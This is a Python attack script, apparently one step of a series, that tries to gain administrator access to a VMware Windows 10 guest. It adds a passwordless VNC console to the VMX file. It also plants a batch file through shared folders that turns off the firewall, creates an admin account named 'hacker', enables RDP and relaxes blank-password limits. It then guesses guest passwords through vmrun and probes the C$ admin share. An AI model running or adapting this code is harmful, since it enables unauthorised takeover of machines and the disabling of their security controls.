#!/usr/bin/env python3
"""Step 15: Add VNC to VMX + connect to console
Console logon bypasses LimitBlankPasswordUse policy
"""
import subprocess
import os
import time

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
TARGET_VMX = r'D:\software\vmware\project\windows\Windows 10.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

# 1. Read current VMX
print("=" * 60)
print("[1] Read current VMX file")
print("=" * 60)
with open(TARGET_VMX, 'r', encoding='utf-8', errors='ignore') as f:
    vmx_content = f.read()

# Check if VNC is already configured
has_vnc = 'RemoteDisplay.vnc' in vmx_content
print(f"VNC already configured: {has_vnc}")

# 2. Add VNC configuration to VMX
print("\n" + "=" * 60)
print("[2] Add VNC to VMX")
print("=" * 60)

vnc_port = 5900
vnc_password = ''  # No password for VNC (blank, like the Windows login)

vnc_lines = f'''
RemoteDisplay.vnc.enabled = "TRUE"
RemoteDisplay.vnc.port = "{vnc_port}"
RemoteDisplay.vnc.password = ""
'''

if not has_vnc:
    # Suspend VM first
    print("[*] Suspending VM...")
    subprocess.run([VMRUN, 'suspend', TARGET_VMX], capture_output=True, text=True, timeout=60)
    time.sleep(5)
    
    # Write VMX with VNC config
    with open(TARGET_VMX, 'a', encoding='utf-8') as f:
        f.write(vnc_lines)
    print("[+] VNC configuration added to VMX")
    
    # Start VM
    print("[*] Starting VM with VNC...")
    subprocess.run([VMRUN, 'start', TARGET_VMX], capture_output=True, text=True, timeout=60)
    time.sleep(10)
else:
    print("[*] VNC already configured, just need to start")

# 3. Try to connect to VNC from host
print("\n" + "=" * 60)
print("[3] Test VNC connection")
print("=" * 60)

# Check if port 5900 is open on the host (VMware VNC binds to host)
import socket
for port in [5900, 5901, 5902]:
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(('127.0.0.1', port))
        print(f"[+] VNC port {port} is OPEN on localhost!")
        s.close()
    except:
        print(f"[-] VNC port {port} is closed")

# Check on VM IP too
for port in [5900, 5901]:
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(('192.168.233.129', port))
        print(f"[+] VNC port {port} is OPEN on 192.168.233.129!")
        s.close()
    except:
        pass

# 4. Try to use vmrun to set password first (enables remote access)
print("\n" + "=" * 60)
print("[4] Try vmrun guest operations with different auth")
print("=" * 60)

# Try without any credentials (VIX API might work without)
try:
    result = subprocess.run([VMRUN, '-T', 'ws',
                            'runProgramInGuest', TARGET_VMX,
                            '-activeWindow',
                            'cmd.exe', '/c', 'whoami > C:\\test_vix.txt 2>&1'],
                           capture_output=True, text=True, timeout=15)
    print(f"No-auth: {result.returncode} - {result.stdout.strip()} {result.stderr.strip()}")
except Exception as e:
    print(f"No-auth: {e}")

# 5. Try to use VMware shared folders
print("\n" + "=" * 60)
print("[5] VMware shared folders")
print("=" * 60)

# Enable shared folders
result = subprocess.run([VMRUN, 'enableSharedFolders', TARGET_VMX],
                       capture_output=True, text=True, timeout=15)
print(f"Enable shared folders: {result.returncode}")

# Add shared folder
share_path = os.path.join(TEMP, 'vmware_share')
os.makedirs(share_path, exist_ok=True)

# Create a script that will modify the registry
reg_script = '''Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]
"DisableAutomaticRestartSignOn"=dword:00000001

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa]
"LimitBlankPasswordUse"=dword:00000000

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]
"fDenyTSConnections"=dword:00000000
'''

with open(os.path.join(share_path, 'fix_policy.reg'), 'w', encoding='utf-8') as f:
    f.write(reg_script)

# Create a bat script to apply the registry fix and add a user
bat_script = '''@echo off
reg import "\\\\vmware-host\\Shared Folders\\share\\fix_policy.reg"
netsh advfirewall set allprofiles state off
net user hacker P@ssw0rd123 /add
net localgroup administrators hacker /add
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
echo DONE > C:\\exploit_done.txt
'''

with open(os.path.join(share_path, 'exploit.bat'), 'w', encoding='utf-8') as f:
    f.write(bat_script)

print(f"[*] Created exploit scripts in {share_path}")

# Add shared folder to VM
result = subprocess.run([VMRUN, 'addSharedFolder', TARGET_VMX, 'share', share_path],
                       capture_output=True, text=True, timeout=15)
print(f"Add shared folder: {result.returncode} - {result.stdout.strip()} {result.stderr.strip()}")

# 6. Now try to execute the exploit script via vmrun
print("\n" + "=" * 60)
print("[6] Execute exploit via shared folder")
print("=" * 60)

for user, pwd in [('lkjm', ''), ('lkjm', '123'), ('lkjm', 'password'), ('lkjm', '1')]:
    try:
        result = subprocess.run([VMRUN, '-T', 'ws', '-gu', user, '-gp', pwd,
                                'runProgramInGuest', TARGET_VMX,
                                '-activeWindow',
                                'cmd.exe', '/c',
                                f'\\\\vmware-host\\Shared Folders\\share\\exploit.bat'],
                               capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            print(f"[+] {user}/{repr(pwd)}: SUCCESS!")
            break
        else:
            print(f"[-] {user}/{repr(pwd)}: Failed ({result.stderr.strip()[:60]})")
    except Exception as e:
        print(f"[-] {user}/{repr(pwd)}: Error ({e})")

# 7. Check if exploit worked by trying SMB with new user
print("\n" + "=" * 60)
print("[7] Test access with new credentials")
print("=" * 60)

import time
time.sleep(5)

for user_pwd in [('hacker', 'P@ssw0rd123'), ('lkjm', '')]:
    try:
        s = socket.socket()
        s.settimeout(3)
        # Just test SMB connectivity
        result = subprocess.run(
            ['net', 'use', f'\\\\192.168.233.129\\C$', f'/user:{user_pwd[0]}', user_pwd[1]],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            print(f"[+] {user_pwd[0]}:{user_pwd[1]} - ACCESS GRANTED!")
            # List C drive
            result2 = subprocess.run(
                ['dir', f'\\\\192.168.233.129\\C$'],
                capture_output=True, text=True, timeout=10
            )
            print(result2.stdout[:1000])
        else:
            print(f"[-] {user_pwd[0]}:{user_pwd[1]} - {result.stderr.strip()[:80]}")
    except Exception as e:
        print(f"[-] {user_pwd[0]}: {e}")

# Clean up
subprocess.run(['net', 'use', f'\\\\192.168.233.129\\C$', '/delete', '/y'],
              capture_output=True, text=True, timeout=5)

print("\n" + "=" * 60)
print("VNC + SHARED FOLDER EXPLOITATION COMPLETE")
print("=" * 60)
